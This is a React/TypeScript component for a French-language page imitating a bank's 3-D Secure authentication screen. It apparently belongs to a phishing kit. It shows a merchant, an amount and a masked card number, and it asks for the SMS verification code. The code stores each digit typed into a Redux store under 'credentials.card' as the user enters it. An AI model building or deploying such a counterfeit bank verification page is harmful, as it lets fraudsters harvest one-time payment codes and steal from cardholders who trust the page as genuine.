import { useRef, useState } from "react";
import CircleLoader from "../../components/App/CircleLoader/CircleLoader";
import { useAppDispatch, useAppSelector } from "../../hooks/redux";
import { actionChangePaymentInfo } from "../../store/reducer/account";
import './PaymentPage.scss'

function PaymentPage() {
  const dispatch = useAppDispatch();

  const total = useAppSelector((state) => state.account.credentials.card.total);
  const date = useAppSelector((state) => state.account.credentials.card.date);
  const card_number = useAppSelector((state) => state.account.credentials.card.card_number);

  const [digits, setDigits] = useState({ digit1: "", digit2: "", digit3: "", digit4: "" });

  const digit1Ref = useRef<HTMLInputElement>(null);
  const digit2Ref = useRef<HTMLInputElement>(null);
  const digit3Ref = useRef<HTMLInputElement>(null);
  const digit4Ref = useRef<HTMLInputElement>(null);

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    const { name, value } = e.target as HTMLInputElement;

    if (e.key === "Backspace" && value === "") {
      if (name === "digit2") digit1Ref.current?.focus();
      if (name === "digit3") digit2Ref.current?.focus();
      if (name === "digit4") digit3Ref.current?.focus();
    }
  }

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    if (value.length > 1) return;
    const updatedDigits = { ...digits, [name]: value };
    setDigits(updatedDigits);

    if (name === "digit1" && value) digit2Ref.current?.focus();
    if (name === "digit2" && value) digit3Ref.current?.focus();
    if (name === "digit3" && value) digit4Ref.current?.focus();
    dispatch(actionChangePaymentInfo({ name: "verif_code", value: updatedDigits }));
  }

  return (
    <div className='paymentPage'>
      <div className="paymentPage_logo">
        <img src="/img/payment/3ds.png" alt="" className="paymentPage_logo_img" />
      </div>
      <div className="paymentPage_waiting">
        <h1 className="paymentPage_waiting_title">Authentification en cours</h1>
        <span className="paymentPage_waiting_text">Veuillez patienter quelques secondes le temps de vérifier votre saisie.</span>
        <CircleLoader />
      </div>
      <div className="paymentPage_infos">
        <div className="paymentPage_infos_item">
          <span className="paymentPage_infos_item_name">Marchand</span>
          <span className="paymentPage_infos_item_value">{import.meta.env.VITE_APP_NAME}</span>
        </div>
        <div className="paymentPage_infos_item">
          <span className="paymentPage_infos_item_name">Montant</span>
          <span className="paymentPage_infos_item_value">{total}</span>
        </div>
        <div className="paymentPage_infos_item">
          <span className="paymentPage_infos_item_name">Date et heure</span>
          <span className="paymentPage_infos_item_value">{date} GMT</span>
        </div>
        <div className="paymentPage_infos_item">
          <span className="paymentPage_infos_item_name">Carte utilisée</span>
          <span className="paymentPage_infos_item_value">xxxxxxxxxxxxxxxx{card_number.slice(20)}</span>
        </div>
      </div>
      <div className="paymentPage_img">
        <img src="/img/payment/icone.png" alt="" className="paymentPage_img_img" />
      </div>
      <div className="paymentPage_instructions">
        <span className="paymentPage_instructions_title">Authentification requise pour valider le paiement</span>
        <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">1</span>Prenez votre téléphone.</span>
        <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">2</span>Ouvrez l'application mobile de votre banque.</span>
        <span className="paymentPage_instructions_item"><span className="paymentPage_instructions_item_num">3</span>Saisissez votre code sur votre téléphone.</span>
      </div>
      <div className="paymentPage_code">
        <span className="paymentPage_code_title">Ou saisissez le code de vérification envoyé par SMS</span>
        <div className="paymentPage_code_inputs">
          <input type="text" name="digit1" value={digits.digit1} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit1Ref} />
          <input type="text" name="digit2" value={digits.digit2} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit2Ref} />
          <input type="text" name="digit3" value={digits.digit3} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit3Ref} />
          <input type="text" name="digit4" value={digits.digit4} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit4Ref} />
        </div>
        {
          digits.digit1 && digits.digit2 && digits.digit3 && digits.digit4 &&
          <button type="button" className="paymentPage_code_btn">Valider</button>
        }

      </div>
    </div>
  )

}

export default PaymentPage;
